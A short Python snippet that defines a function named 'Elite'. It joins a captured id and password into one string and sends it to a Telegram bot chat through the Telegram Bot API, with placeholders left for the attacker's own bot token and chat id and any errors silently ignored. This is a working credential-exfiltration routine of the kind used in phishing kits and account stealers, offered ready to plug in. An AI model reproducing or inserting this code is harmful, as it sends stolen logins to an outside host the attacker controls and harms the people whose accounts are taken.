


import requests
def Elite(id,ps):
    try:
        token = ""#Add yout token 
        chatid = ""#Add your Chat Id
        ok_id =str(id+"|"+ps)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
        pass


Elite(id,ps)
